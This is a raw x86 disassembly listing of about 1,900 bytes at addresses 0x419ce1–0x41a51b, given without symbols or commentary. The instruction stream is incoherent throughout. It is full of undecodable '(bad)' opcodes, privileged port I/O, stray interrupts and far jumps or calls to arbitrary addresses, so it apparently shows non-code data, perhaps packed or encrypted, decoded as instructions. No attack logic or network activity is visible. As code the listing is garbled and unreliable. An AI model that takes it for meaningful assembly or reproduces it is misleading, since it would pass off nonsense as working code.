  419ce1:	fnsave [esi-0x25302929]
  419ce7:	mov    ebx,0xcfc8ddcf
  419cec:	in     eax,dx
  419ced:	mov    eax,0xd3f2e1b7
  419cf2:	fst    st(1)
  419cf4:	in     eax,0xc0
  419cf6:	(bad)  
  419cf7:	aad    0xc5
  419cf9:	loop   0x419d07
  419cfb:	or     al,0xd8
  419cfd:	or     ch,dl
  419cff:	lock mov cl,0xa8
  419d02:	ror    edi,0xc8
  419d05:	lock (bad) 
  419d08:	jmp    0xd2ba:0xd6fed8ea
  419d0f:	add    ebp,ebp
  419d11:	neg    bh
  419d13:	(bad)
  419d16:	fcomp  st(2)
  419d18:	pop    es
  419d19:	out    0xdf,eax
  419d1b:	(bad)  
  419d1c:	loope  0x419cf6
  419d1e:	lods   eax,DWORD PTR ds:[esi]
  419d1f:	lods   eax,DWORD PTR ds:[esi]
  419d20:	jmp    0xb2f7:0xa9e7abeb
  419d27:	out    dx,eax
  419d28:	int    0xf0
  419d2a:	lock leave 
  419d2c:	mov    edi,0xe3baf8ee
  419d31:	(bad)  
  419d33:	cli    
  419d34:	jecxz  0x419d26
  419d36:	ret    
  419d37:	(bad)  
  419d39:	(bad)  
  419d3a:	loope  0x419d3b
  419d3c:	loopne 0x419d1f
  419d3e:	loop   0x419d0a
  419d40:	(bad)  
  419d41:	fdiv   QWORD PTR [ebp-0x80c0412]
  419d47:	fcom   st(6)
  419d49:	neg    dl
  419d4b:	fcmovne st,st(4)
  419d4d:	mov    esi,0x3e7e0fd
  419d52:	vpaddusb ymm3,ymm3,ymm3
  419d56:	dec    ecx
  419d58:	jmp    0x419d40
  419d5a:	ret    
  419d5b:	jmp    0xcbc2:0xadbe02f2
  419d62:	icebp  
  419d63:	call   0xb4f6594c
  419d68:	int    0xc4
  419d6a:	(bad)  
  419d6c:	shr    edx,1
  419d6e:	repnz add eax,edx
  419d71:	add    bh,BYTE PTR [edi-0x21ff0afe]
  419d77:	loope  0x419d5e
  419d79:	(bad)  
  419d7a:	clc    
  419d7b:	or     al,0xe7
  419d7d:	leave  
  419d7e:	int    0xdd
  419d80:	call   0xc1176843
  419d85:	rcl    al,1
  419d87:	(bad)  
  419d88:	repz cli 
  419d8a:	icebp  
  419d8b:	mov    dh,0xd7
  419d8d:	fxch   st(6)
  419d8f:	mov    eax,0xf9ded1d7
  419d94:	(bad)  
  419d95:	(bad)  
  419d96:	or     cl,BYTE PTR [edx]
  419d98:	rcl    esi,0xc8
  419d9b:	jmp    0xbd0a987e
  419da0:	(bad)  
  419da1:	jecxz  0x419d84
  419da3:	aam    0xf6
  419da5:	retf   
  419da6:	loope  0x419d99
  419da8:	int    0xf7
  419daa:	cmc    
  419dab:	call   ecx
  419dad:	fstp   TBYTE PTR [edx+0x507f8d1]
  419db3:	inc    eax
  419db5:	shl    bh,cl
  419db7:	rcr    ch,0xc6
  419dba:	add    al,0x2
  419dbc:	call   0xe0084fca
  419dc1:	ror    cl,cl
  419dc3:	out    0xda,al
  419dc5:	aad    0xd5
  419dc7:	in     eax,0xc9
  419dc9:	shl    bl,1
  419dcb:	int3   
  419dcc:	ret    
  419dcd:	repz shr esi,cl
  419dd0:	int3   
  419dd1:	test   ah,0xe2
  419dd4:	push   es
  419dd5:	jmp    0xff08869a
  419dda:	into   
  419ddb:	std    
  419ddc:	(bad)  
  419dde:	(bad)
  419de1:	cmc    
  419de2:	(bad)  
  419de4:	in     eax,0xfa
  419de6:	jmp    0xf73f73c4
  419deb:	repnz fprem1 
  419dee:	mov    edi,0xdae207d5
  419df3:	out    0xdf,eax
  419df5:	cli    
  419df6:	mov    edi,0xedfceadf
  419dfb:	std    
  419dfc:	repz stc 
  419dfe:	loopne 0x419de9
  419e00:	shl    bl,cl
  419e02:	ret    0xc5aa
  419e05:	jmp    0xda3571e0
  419e0a:	shr    ecx,1
  419e0c:	add    esi,ebp
  419e0e:	add    edi,esp
  419e10:	fcmovb st,st(2)
  419e12:	rcr    ebx,cl
  419e14:	ret    
  419e15:	sti    
  419e16:	test   DWORD PTR [ecx],0xb0a05fe
  419e1c:	fcomp  st(7)
  419e1e:	retf   0xc8c3
  419e21:	loop   0x419dd0
  419e23:	mov    ch,0xe5
  419e25:	ror    esp,cl
  419e27:	into   
  419e28:	out    dx,al
  419e29:	call   0xd23a712b
  419e2e:	iret   
  419e2f:	shl    dl,1
  419e31:	clc    
  419e32:	out    0xc7,eax
  419e34:	clc    
  419e35:	loop   0x419e17
  419e37:	or     esi,ebx
  419e39:	iret   
  419e3a:	fdivr  st,st(5)
  419e3c:	lds    ecx,FWORD PTR [ecx]
  419e3e:	rcr    ah,cl
  419e40:	in     eax,dx
  419e41:	mov    ebp,0xbab3f1e0
  419e46:	(bad)  
  419e47:	out    0xbb,al
  419e49:	aam    0xca
  419e4b:	cmc    
  419e4c:	xlat   BYTE PTR ds:[ebx]
  419e4d:	mov    al,0xd8
  419e4f:	(bad)  
  419e51:	mov    eax,0xcafff8c5
  419e56:	cld    
  419e57:	or     esp,eax
  419e59:	(bad)  
  419e5a:	fimul  DWORD PTR [eax*1-0x22351d04]
  419e61:	in     al,dx
  419e62:	fmul   st(2),st
  419e64:	in     al,0xf7
  419e66:	out    0xec,eax
  419e68:	stc    
  419e69:	mov    eax,0xcfb1d1ec
  419e6e:	rcr    ah,1
  419e70:	shr    ch,cl
  419e72:	mov    dl,0xe5
  419e75:	mov    esp,0xcbf4f0d5
  419e7a:	stc    
  419e7b:	add    dh,bl
  419e7d:	icebp  
  419e7e:	repz fcom st(2)
  419e81:	mov    cl,0xd0
  419e83:	mov    cl,0xef
  419e85:	jmp    0xf8f77e41
  419e8a:	jmp    0xf016a14a
  419e8f:	ror    ch,1
  419e91:	mul    bh
  419e93:	aad    0xda
  419e95:	test   ah,0xfc
  419e98:	add    eax,0xe5c801e4
  419e9d:	fsubr  st,st(2)
  419e9f:	mul    eax
  419ea1:	loop   0x419e50
  419ea3:	rol    ebx,0xe4
  419ea6:	mov    dl,0xef
  419ea8:	enter  0xecf4,0x3
  419eac:	mov    ebx,0x7d2ddd6
  419eb1:	sar    esi,cl
  419eb3:	mov    esi,0x200f0e5
  419eb8:	cld    
  419eb9:	mov    esi,0xd009e0ec
  419ebf:	scas   al,BYTE PTR es:[edi]
  419ec0:	scas   al,BYTE PTR es:[edi]
  419ec1:	aad    0xc3
  419ec3:	mov    esp,0xc9d6e6c2
  419ec8:	(bad)  
  419ec9:	mov    ecx,0xf5cad0f0
  419ece:	cld    
  419ecf:	aad    0xdc
  419ed1:	mov    ebp,0xd4c2c3e3
  419ed6:	add    BYTE PTR [ebx],cl
  419ed8:	cli    
  419ed9:	fld    st(7)
  419edb:	or     al,0xdc
  419edd:	(bad)  
  419ede:	jmp    0x419ec9
  419ee0:	call   0xf618708d
  419ee5:	icebp  
  419ee6:	(bad)  
  419ee8:	mov    edi,0xf9cbb4ce
  419eed:	ror    cl,cl
  419eef:	fsubr  st,st(7)
  419ef1:	(bad)  
  419ef3:	rcr    ah,1
  419ef5:	jecxz  0x419ef7
  419ef7:	fcmove st,st(2)
  419ef9:	loopne 0x419ec2
  419efb:	retf   
  419efc:	out    dx,al
  419efd:	stc    
  419efe:	out    dx,al
  419eff:	loopne 0x419eee
  419f01:	repz mov ch,0xd3
  419f04:	loope  0x419eba
  419f06:	iret   
  419f07:	mov    dh,0xc6
  419f09:	jmp    0x419ed0
  419f0b:	stc    
  419f0c:	xlat   BYTE PTR ds:[ebx]
  419f0d:	mov    esi,0xfedbd0ba
  419f12:	add    esi,edi
  419f14:	retf   
  419f15:	jmp    0xd91b61f1
  419f1a:	sti    
  419f1b:	clc    
  419f1c:	out    0x7,eax
  419f1e:	in     al,dx
  419f1f:	repnz retf 
  419f21:	lock mov esp,0xb0c0b0c1
  419f27:	repnz shr BYTE PTR [esi+edx*8-0x4803151c],cl
  419f2f:	std    
  419f30:	hlt    
  419f31:	fdivp  st(4),st
  419f33:	ret    0x6d8
  419f36:	stc    
  419f37:	(bad)  [ecx]
  419f39:	retf   0xeb
  419f3c:	add    BYTE PTR [ebx],al
  419f3e:	(bad)
  419f41:	int    0xaf
  419f43:	retf   0xd0e6
  419f46:	(bad)  
  419f47:	xlat   BYTE PTR ds:[ebx]
  419f48:	hlt    
  419f49:	icebp  
  419f4a:	mov    bl,0xda
  419f4c:	xlat   BYTE PTR ds:[ebx]
  419f4d:	rcl    eax,1
  419f4f:	test   DWORD PTR [edx],0xac401c0
  419f55:	rcr    ah,0xfd
  419f58:	jmp    0xe626681d
  419f5d:	leave  
  419f5e:	shl    al,1
  419f60:	out    0xc7,eax
  419f62:	into   
  419f63:	mov    esp,0xd9d6d9d2
  419f68:	mov    ebx,0xc9fac8dd
  419f6d:	mov    edx,0xdaff03ed
  419f72:	loope  0x419f71
  419f74:	jecxz  0x419f52
  419f76:	fucomip st,st(0)
  419f78:	or     al,BYTE PTR [ebx]
  419f7a:	cli    
  419f7b:	or     al,0xb
  419f7d:	loopne 0x419f5c
  419f7f:	in     al,0xcc
  419f81:	mov    dh,0xf3
  419f83:	iret   
  419f84:	les    ebp,FWORD PTR [eax-0x10103847]
  419f8a:	repnz leave 
  419f8c:	jmp    0x419f5b
  419f8e:	int3   
  419f8f:	hlt    
  419f90:	rcr    ch,1
  419f92:	(bad)  
  419f93:	cld    
  419f94:	fcomp  st(7)
  419f96:	mov    edi,0x2d4c5db
  419f9b:	out    0xdc,al
  419f9d:	cld    
  419f9e:	enter  0xe0e8,0xa4
  419fa2:	retf   0xb7f3
  419fa5:	idiv   bl
  419fa7:	mov    ecx,0xfff6efcf
  419fac:	out    dx,eax
  419fad:	iret   
  419fae:	cld    
  419faf:	in     eax,dx
  419fb0:	repnz mov esp,0x9fc00e0
  419fb6:	jmp    ecx
  419fb8:	jmp    0xafe0:0xfe0cffe0
  419fbf:	int    0xbd
  419fc1:	mov    esi,0xe6ade7cf
  419fc6:	mov    dh,0xd0
  419fc8:	in     al,dx
  419fc9:	fcomip st,st(4)
  419fcb:	mov    dh,0xf8
  419fcd:	(bad)  
  419fce:	not    edi
  419fd0:	out    dx,eax
  419fd1:	add    cl,dh
  419fd3:	sar    DWORD PTR [ebp-0x233a2304],0xbc
  419fda:	jmp    0x419fbd
  419fdc:	add    dh,cl
  419fde:	mov    esp,0xedf2cdeb
  419fe3:	scas   al,BYTE PTR es:[edi]
  419fe4:	mov    bh,0xeb
  419fe6:	repz jmp 0x419fe8
  419fe9:	(bad)  
  419fea:	in     al,0xdd
  419fec:	ret    
  419fed:	jecxz  0x419fd0
  419fef:	loope  0x419fd2
  419ff1:	mov    eax,0xfec203c3
  419ff6:	loopne 0x419fe3
  419ff8:	shl    ebp,0xeb
  419ffb:	out    0xfc,al
  419ffd:	add    DWORD PTR [ecx-0xe081548],esi
  41a003:	ret    
  41a004:	sti    
  41a005:	mov    al,0xf5
  41a007:	hlt    
  41a008:	out    dx,eax
  41a009:	lock clc 
  41a00b:	fcmovnbe st,st(7)
  41a00d:	loope  0x41a008
  41a00f:	in     eax,dx
  41a010:	fcomip st,st(6)
  41a012:	loope  0x419fd5
  41a014:	cmc    
  41a015:	pop    es
  41a016:	(bad)  
  41a018:	fisttp WORD PTR [esi]
  41a01a:	fmul   DWORD PTR [eiz*8-0x39141b0e]
  41a021:	mov    bh,0xc3
  41a023:	mov    esp,0xd9f6cde3
  41a028:	mov    ch,0xfa
  41a02a:	jmp    0x41a018
  41a02c:	fstp   st(0)
  41a02e:	mov    bh,0xd0
  41a030:	rol    esi,cl
  41a032:	fdiv   st,st(5)
  41a034:	add    eax,0xdfe5e2f7
  41a039:	loopne 0x41a03d
  41a03b:	retf   0xc8f8
  41a03e:	enter  0xf0a9,0xec
  41a042:	mov    al,0xce
  41a044:	test   eax,0xd8cbc9d1
  41a049:	icebp  
  41a04a:	fnstsw WORD PTR [ebx-0x2b012131]
  41a050:	stc    
  41a051:	(bad)  
  41a053:	add    edi,eax
  41a055:	inc    cl
  41a057:	cmc    
  41a058:	fucom  st(4)
  41a05a:	cmc    
  41a05b:	fcmovb st,st(4)
  41a05d:	fst    st(0)
  41a05f:	(bad)  
  41a060:	mov    cl,0xcd
  41a062:	jecxz  0x41a028
  41a064:	(bad)  
  41a065:	loope  0x41a01d
  41a067:	mov    dl,0xf6
  41a069:	mov    ebx,0xc8ded2ed
  41a06e:	(bad)  
  41a070:	pop    es
  41a071:	not    edi
  41a073:	vshufps ymm0,ymm3,ymm7,0xfb
  41a078:	(bad)  
  41a07a:	in     eax,dx
  41a07b:	or     BYTE PTR [esi],cl
  41a07d:	(bad)  
  41a07e:	fxch   st(7)
  41a080:	mov    bl,0xc6
  41a082:	loopne 0x41a071
  41a084:	call   0xdc388e71
  41a089:	mov    dh,0xcd
  41a08b:	imul   bl
  41a08d:	(bad)  
  41a08f:	out    dx,al
  41a090:	fcmovu st,st(7)
  41a092:	(bad)
  41a095:	cmc    
  41a096:	dec    BYTE PTR [ebx]
  41a098:	stc    
  41a099:	cli    
  41a09a:	into   
  41a09b:	add    edi,esp
  41a09d:	or     ch,al
  41a09f:	in     eax,0xae
  41a0a1:	shr    cl,1
  41a0a3:	out    dx,al
  41a0a4:	cmc    
  41a0a5:	ret    0xdff7
  41a0a8:	in     eax,0xfb
  41a0aa:	jmp    0x41a09e
  41a0ac:	cmc    
  41a0ad:	std    
  41a0ae:	in     eax,dx
  41a0af:	rcl    ebx,cl
  41a0b1:	icebp  
  41a0b2:	add    al,dh
  41a0b4:	jecxz  0x41a0c0
  41a0b6:	neg    dl
  41a0b8:	fcmovbe st,st(6)
  41a0ba:	add    al,0xce
  41a0bc:	adc    ecx,ebx
  41a0be:	test   eax,0xcad2e1c8
  41a0c3:	jmp    0x41a077
  41a0c5:	mov    bl,0xe1
  41a0c7:	fcomi  st,st(2)
  41a0c9:	rcr    dl,cl
  41a0cb:	mov    ch,0xbd
  41a0cd:	add    DWORD PTR [ebx-0x2043f813],edi
  41a0d3:	mov    esi,0x9f5b9
  41a0d8:	cli    
  41a0d9:	(bad)  
  41a0da:	loope  0x41a0e0
  41a0dc:	in     eax,dx
  41a0dd:	into   
  41a0de:	rcr    esi,cl
  41a0e0:	(bad)  
  41a0e1:	jmp    0xc9f2:0xe4caacf6
  41a0e8:	(bad)  
  41a0e9:	cli    
  41a0ea:	shl    bh,1
  41a0ec:	cld    
  41a0ed:	rcl    eax,cl
  41a0ef:	int    0xf3
  41a0f1:	loop   0x41a0d5
  41a0f3:	shl    ebp,cl
  41a0f5:	or     bl,dh
  41a0f7:	or     dl,ch
  41a0f9:	aam    0x0
  41a0fb:	ret    0xf803
  41a0fe:	lods   eax,DWORD PTR ds:[esi]
  41a0ff:	in     eax,dx
  41a100:	jmp    0x41a0f3
  41a102:	(bad)  
  41a103:	out    0xca,eax
  41a105:	enter  0xd9b7,0xcf
  41a109:	into   
  41a10a:	jmp    0x1045ffc
  41a10f:	ffreep st(2)
  41a111:	stc    
  41a112:	(bad)
  41a115:	push   es
  41a116:	in     eax,0x8
  41a118:	pop    es
  41a119:	(bad)  
  41a11a:	leave  
  41a11b:	cli    
  41a11c:	push   es
  41a11d:	cli    
  41a11e:	lods   al,BYTE PTR ds:[esi]
  41a11f:	fidiv  WORD PTR [edi-0x1a16150e]
  41a125:	leave  
  41a126:	(bad)  
  41a127:	ror    esi,1
  41a129:	mov    edi,0xd8decece
  41a12e:	iret   
  41a12f:	repnz mov esp,0xf2dac6e1
  41a135:	add    ah,bh
  41a137:	out    0x8,al
  41a139:	add    esi,esp
  41a13b:	(bad)  
  41a13d:	fdiv   QWORD PTR [edx-0x522d1d15]
  41a143:	mov    esp,0xf6f4b0d3
  41a148:	mov    eax,0xb1b4d1d3
  41a14d:	enter  0xb8f3,0xdf
  41a151:	in     eax,dx
  41a152:	add    edi,edx
  41a154:	div    bh
  41a156:	out    0x0,al
  41a158:	add    al,0xe4
  41a15a:	call   0xe30b8640
  41a15f:	in     al,dx
  41a160:	out    0xbd,al
  41a162:	fnsave [ebp-0x3a124b1c]
  41a168:	mov    cl,0xcc
  41a16a:	jmp    0x41a164
  41a16c:	aad    0xc3
  41a16e:	add    bl,ah
  41a170:	shl    bl,0xd7
  41a173:	repnz fild DWORD PTR ds:0xf5dadae1
  41a17a:	fdiv   st,st(4)
  41a17c:	repz clc 
  41a17e:	jmp    0xe2c1:0xefaca8bd
  41a185:	iret   
  41a186:	idiv   cl
  41a188:	les    esi,FWORD PTR [edi-0x424b2122]
  41a18e:	add    eax,DWORD PTR [ecx]
  41a190:	std    
  41a191:	mov    edi,0x6d2c104
  41a196:	or     esi,esp
  41a198:	(bad)  
  41a199:	(bad)  
  41a19a:	sti    
  41a19b:	(bad)  
  41a19c:	push   ebx
  41a19e:	int3   
  41a19f:	mov    esi,0xc3e4edac
  41a1a4:	out    dx,eax
  41a1a5:	retf   0xe8e0
  41a1a8:	int    0xf7
  41a1aa:	in     al,dx
  41a1ab:	std    
  41a1ac:	cld    
  41a1ad:	fiadd  WORD PTR [ebx]
  41a1af:	out    0xef,eax
  41a1b1:	jecxz  0x41a18d
  41a1b3:	rcl    al,0xf4
  41a1b6:	jecxz  0x41a192
  41a1b8:	add    eax,0xddc200f9
  41a1bd:	adc    esp,ebp
  41a1bf:	jmp    0x41a1a3
  41a1c1:	shl    BYTE PTR [esi-0x182e2540],cl
  41a1c7:	shl    ah,cl
  41a1c9:	aam    0xee
  41a1cb:	dec    ebp
  41a1cd:	leave  
  41a1ce:	mov    esi,0xd1ddfdcc
  41a1d3:	cmc    
  41a1d4:	fcompp 
  41a1d6:	jecxz  0x41a1b3
  41a1d8:	clc    
  41a1d9:	leave  
  41a1da:	or     ah,bh
  41a1dc:	add    al,bh
  41a1de:	retf   
  41a1df:	loopne 0x41a1b0
  41a1e1:	mov    bh,0xae
  41a1e3:	(bad)  
  41a1e4:	in     eax,dx
  41a1e5:	stc    
  41a1e6:	aad    0xf5
  41a1e8:	mov    ebx,0xe9dde4c9
  41a1ed:	fucomp st(7)
  41a1ef:	out    dx,eax
  41a1f0:	icebp  
  41a1f1:	clc    
  41a1f2:	aad    0xf7
  41a1f4:	ret    
  41a1f5:	cmc    
  41a1f6:	pop    es
  41a1f7:	(bad)  
  41a1f9:	pop    es
  41a1fa:	push   cs
  41a1fb:	jmp    ecx
  41a1fd:	std    
  41a1fe:	(bad)  
  41a200:	into   
  41a201:	iret   
  41a202:	mov    bl,0xe5
  41a204:	mov    ah,0xc2
  41a206:	jmp    0x41a1d9
  41a208:	in     eax,dx
  41a209:	std    
  41a20a:	aad    0xde
  41a20c:	fsubr  st(3),st
  41a20e:	mov    edx,0xf4d1bfee
  41a213:	(bad)  
  41a214:	out    0xb,eax
  41a216:	leave  
  41a217:	leave  
  41a218:	fsubr  st(0),st
  41a21a:	call   0xaf4bb51e
  41a21f:	shl    BYTE PTR [edx-0x524a4252],1
  41a225:	aam    0xe7
  41a227:	iret   
  41a228:	stc    
  41a229:	repz stc 
  41a22b:	jmp    0x41a1fb
  41a22d:	mov    ecx,0xfdf8eefb
  41a232:	cld    
  41a233:	aam    0xe5
  41a235:	cmc    
  41a236:	aam    0xc1
  41a238:	jmp    eax
  41a23a:	aad    0x7
  41a23c:	repnz stc 
  41a23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a23f:	mov    al,0xbc
  41a241:	cmc    
  41a242:	into   
  41a243:	out    0xfa,eax
  41a245:	lock aad 0xb0
  41a248:	out    0xb9,eax
  41a24a:	mov    eax,0x1f0fade
  41a24f:	not    ebp
  41a251:	mov    eax,0xd5fffbf9
  41a256:	add    DWORD PTR [esi],eax
  41a258:	add    al,0x2
  41a25a:	leave  
  41a25b:	in     al,0xda
  41a25d:	or     BYTE PTR [edx+esi*8-0x8090f4d],ch
  41a264:	out    dx,eax
  41a265:	jmp    0xee358336
  41a26a:	dec    al
  41a26c:	std    
  41a26d:	cli    
  41a26e:	rol    edx,1
  41a270:	out    dx,eax
  41a271:	add    esi,esp
  41a273:	int3   
  41a274:	fcomp  st(1)
  41a276:	ret    0xbe2
  41a279:	out    0xe,al
  41a27b:	fsubr  st,st(7)
  41a27d:	out    0xb3,eax
  41a27f:	jmp    0xc812506f
  41a284:	into   
  41a285:	into   
  41a286:	clc    
  41a287:	shr    bl,cl
  41a289:	mov    ecx,0xd3e3ebed
  41a28e:	fcomip st,st(3)
  41a290:	mov    esp,0xf5fa07f2
  41a295:	ret    0xc4f8
  41a298:	add    al,0xf8
  41a29a:	aad    0xd
  41a29c:	repnz in al,dx
  41a29e:	leave  
  41a29f:	mov    eax,0xadcecddc
  41a2a4:	out    0xb1,eax
  41a2a6:	mul    esi
  41a2a8:	int    0xcd
  41a2aa:	mov    bl,0xea
  41a2ac:	in     eax,dx
  41a2ad:	mov    al,0xb9
  41a2af:	(bad)  
  41a2b0:	mov    ch,0xd3
  41a2b2:	(bad)  
  41a2b4:	pop    es
  41a2b5:	cli    
  41a2b6:	add    bh,ah
  41a2b8:	fcomp  st(6)
  41a2ba:	in     eax,0xde
  41a2bc:	adc    eax,eax
  41a2be:	ror    cl,0xe4
  41a2c1:	(bad)  
  41a2c2:	iret   
  41a2c3:	mov    ah,0xd1
  41a2c5:	shr    BYTE PTR [edi-0x2c15064f],cl
  41a2cb:	sti    
  41a2cc:	mov    edx,0xb503c2f1
  41a2d1:	in     eax,0xc5
  41a2d3:	rol    bl,1
  41a2d5:	jmp    0xef08:0xe9eae7fb
  41a2dc:	loope  0x41a2bc
  41a2de:	shl    bl,1
  41a2e0:	rcl    ebx,1
  41a2e2:	out    dx,al
  41a2e3:	in     eax,0xdb
  41a2e5:	int    0xd2
  41a2e7:	fldl2e 
  41a2e9:	leave  
  41a2ea:	mov    ebx,0xd5c3fef3
  41a2ef:	out    0xb5,eax
  41a2f1:	mov    ah,0xf2
  41a2f3:	inc    edi
  41a2f5:	in     eax,0xc4
  41a2f7:	pop    es
  41a2f8:	loopne 0x41a309
  41a2fa:	in     eax,dx
  41a2fb:	loop   0x41a2fc
  41a2fd:	adc    ch,BYTE PTR [ebx-0x53085356]
  41a303:	mov    esp,0xefd1baad
  41a308:	(bad)  
  41a30a:	(bad)  
  41a30b:	std    
  41a30c:	mov    eax,0xcef1b9fd
  41a311:	loopne 0x41a318
  41a313:	jmp    0x41a317
  41a315:	shr    ecx,0x7
  41a318:	xlat   BYTE PTR ds:[ebx]
  41a319:	vpmaxub xmm4,xmm0,xmm7
  41a31d:	or     dh,BYTE PTR [ecx-0x331c4f17]
  41a323:	(bad)  
  41a324:	lock fcmovnbe st,st(7)
  41a327:	fcmove st,st(0)
  41a329:	stc    
  41a32a:	in     eax,0xea
  41a32c:	int3   
  41a32d:	int    0xf5
  41a32f:	(bad)  
  41a330:	mov    ecx,0xe3fff1
  41a335:	loop   0x41a31d
  41a337:	or     ebp,edx
  41a339:	push   cs
  41a33a:	in     al,dx
  41a33b:	in     al,dx
  41a33c:	(bad)  
  41a33d:	loop   0x41a2fd
  41a33f:	out    0xed,eax
  41a341:	out    dx,al
  41a342:	mov    ch,0xb2
  41a344:	mov    dh,0xb0
  41a346:	sar    DWORD PTR [ebx-0x104a3402],0xb5
  41a34d:	add    edx,edx
  41a34f:	icebp  
  41a350:	add    esi,ebx
  41a352:	ret    
  41a353:	std    
  41a354:	cmc    
  41a355:	retf   
  41a356:	aam    0xfc
  41a358:	add    DWORD PTR [esi],ecx
  41a35a:	(bad)  
  41a35b:	(bad)  
  41a35d:	add    cl,dl
  41a35f:	repnz (bad) 
  41a361:	scas   eax,DWORD PTR es:[edi]
  41a362:	repz xlat BYTE PTR ds:[ebx]
  41a364:	mov    ch,0xf3
  41a366:	iret   
  41a367:	into   
  41a368:	jmp    0x41a357
  41a36a:	mov    ecx,0xffefefd7
  41a36f:	lock fdiv st,st(2)
  41a372:	mov    esi,0xe5f2fc07
  41a377:	out    0xee,eax
  41a379:	call   0x2ba97f
  41a37e:	call   0xcd2c8860
  41a383:	into   
  41a384:	loopne 0x41a35a
  41a386:	rcr    edx,1
  41a388:	int3   
  41a389:	call   0xba3a7f78
  41a38e:	mov    ebx,0xbe02dded
  41a393:	mul    ah
  41a395:	jmp    0xde17a35d
  41a39a:	cli    
  41a39b:	add    edi,ecx
  41a39d:	or     dh,BYTE PTR [ecx-0x365b1756]
  41a3a3:	test   esi,0xced6d4db
  41a3a9:	mov    dh,0xc8
  41a3ab:	icebp  
  41a3ac:	stc    
  41a3ad:	mov    ecx,0xd7fdded3
  41a3b2:	icebp  
  41a3b3:	mov    edx,0x607d5db
  41a3b8:	add    ah,ah
  41a3ba:	les    ecx,FWORD PTR [edx]
  41a3bc:	(bad)
  41a3bf:	imul   edx
  41a3c1:	(bad)  
  41a3c3:	in     eax,0xc1
  41a3c5:	jmp    0x41a3a2
  41a3c7:	call   0xefff91b1
  41a3cc:	enter  0xd7c9,0xf6
  41a3d0:	mov    eax,0x4e2d3d9
  41a3d5:	jmp    0xe53174b2
  41a3da:	loop   0x41a3d8
  41a3dc:	fldl2t 
  41a3de:	shl    ecx,cl
  41a3e0:	(bad)  
  41a3e1:	retf   0xe3c1
  41a3e4:	(bad)
  41a3e7:	scas   al,BYTE PTR es:[edi]
  41a3e8:	out    dx,al
  41a3e9:	(bad)  
  41a3ea:	mov    ah,0xc4
  41a3ec:	iret   
  41a3ed:	into   
  41a3ee:	cmc    
  41a3ef:	fcmovne st,st(5)
  41a3f1:	ret    
  41a3f2:	lock fadd DWORD PTR [esi]
  41a3f5:	hlt    
  41a3f6:	hlt    
  41a3f7:	jmp    0x41a3be
  41a3f9:	sti    
  41a3fa:	hlt    
  41a3fb:	clc    
  41a3fc:	fadd   DWORD PTR [edx]
  41a3fe:	fdivr  DWORD PTR [ebp-0x3e23122e]
  41a404:	jmp    0x41a3fd
  41a406:	aad    0xb2
  41a408:	in     al,0xbf
  41a40a:	repnz leave 
  41a40c:	mov    ebx,0xf4d3fdbc
  41a411:	in     eax,0xdc
  41a413:	loope  0x41a414
  41a415:	(bad)  
  41a416:	out    0xfe,eax
  41a418:	in     al,0xd8
  41a41a:	fisttp WORD PTR [edx]
  41a41c:	add    al,BYTE PTR [eax]
  41a41e:	in     eax,0xd2
  41a420:	mov    ebp,0xccc0eef3
  41a425:	mov    dl,0xe1
  41a427:	(bad)  
  41a428:	out    dx,al
  41a429:	mov    bh,0xd6
  41a42b:	hlt    
  41a42c:	clc    
  41a42d:	rcr    eax,1
  41a42f:	aam    0xc2
  41a431:	fcos   
  41a433:	fadd   QWORD PTR ds:0xc1f7e0e1
  41a439:	fsub   st(1),st
  41a43b:	clc    
  41a43c:	jmp    0xf2b6:0xe5f2c3c0
  41a443:	sti    
  41a444:	lods   eax,DWORD PTR ds:[esi]
  41a445:	ror    edi,cl
  41a447:	enter  0xedb4,0xcd
  41a44b:	icebp  
  41a44c:	jecxz  0x41a408
  41a44e:	mov    ebx,0xc7c7e7c3
  41a453:	add    eax,0xd9d909f1
  41a458:	push   cs
  41a459:	call   0xdf43822c
  41a45e:	(bad)  
  41a45f:	fdivr  QWORD PTR [ebp-0x172d4c33]
  41a465:	sar    al,cl
  41a467:	out    dx,eax
  41a468:	mov    dh,0xc9
  41a46a:	leave  
  41a46b:	retf   0x1ee
  41a46e:	icebp  
  41a46f:	(bad)  
  41a471:	pop    es
  41a472:	inc    esi
  41a474:	loopne 0x41a45c
  41a476:	loope  0x41a43c
  41a478:	push   cs
  41a479:	(bad)  
  41a47a:	int    0xe4
  41a47c:	jmp    0xe2b2:0xf7e7a911
  41a483:	in     eax,0xc0
  41a485:	loopne 0x41a440
  41a487:	jmp    0xf0e2:0xb5bec9b8
  41a48e:	in     eax,dx
  41a48f:	clc    
  41a490:	clc    
  41a491:	rcl    al,0xe4
  41a494:	cmc    
  41a495:	test   cl,0xc1
  41a498:	hlt    
  41a499:	fisttp WORD PTR [edx]
  41a49b:	hlt    
  41a49c:	iret   
  41a49d:	loopne 0x41a446
  41a49f:	jmp    0xc8d6:0xcfacd0bd
  41a4a6:	shl    DWORD PTR [ebp-0x26012b0a],1
  41a4ac:	add    ecx,edi
  41a4ae:	fst    st(6)
  41a4b0:	in     al,dx
  41a4b1:	sti    
  41a4b2:	ret    
  41a4b3:	push   ebp
  41a4b5:	or     DWORD PTR [edi-0x251f1017],edi
  41a4bb:	stc    
  41a4bc:	retf   
  41a4bd:	(bad)  
  41a4be:	mov    esi,0xaca8ecc3
  41a4c3:	(bad)  
  41a4c4:	jmp    0xe9f47275
  41a4c9:	mov    esi,0xdafccfee
  41a4ce:	leave  
  41a4cf:	mov    esi,0xbcf5cef0
  41a4d4:	pop    es
  41a4d5:	out    0xc1,al
  41a4d7:	xlat   BYTE PTR ds:[ebx]
  41a4d8:	psubsb mm5,mm5
  41a4db:	leave  
  41a4dc:	out    0xfa,al
  41a4de:	shl    edx,cl
  41a4e0:	fstp   st(4)
  41a4e2:	mov    esp,0xbbf1e4d1
  41a4e7:	mov    ecx,0xecd5fade
  41a4ec:	leave  
  41a4ed:	mov    al,0xcc
  41a4ef:	into   
  41a4f0:	xlat   BYTE PTR ds:[ebx]
  41a4f1:	cld    
  41a4f2:	shr    ebx,1
  41a4f4:	fcmovb st,st(0)
  41a4f6:	jmp    0xe502:0xf4e3d6de
  41a4fd:	in     al,dx
  41a4fe:	jecxz  0x41a4b1
  41a500:	repz out 0xdc,al
  41a503:	rcl    ebp,0xc8
  41a506:	(bad)  
  41a507:	(bad)  
  41a509:	mov    ch,0xb8
  41a50b:	repnz mov ecx,0xcebec1f6
  41a511:	sti    
  41a512:	loope  0x41a510
  41a514:	(bad)  
  41a516:	push   es
  41a517:	(bad)  
  41a518:	jmp    0x41a510
  41a51a:	(bad)  
  41a51b:	fcmove st,st(2)
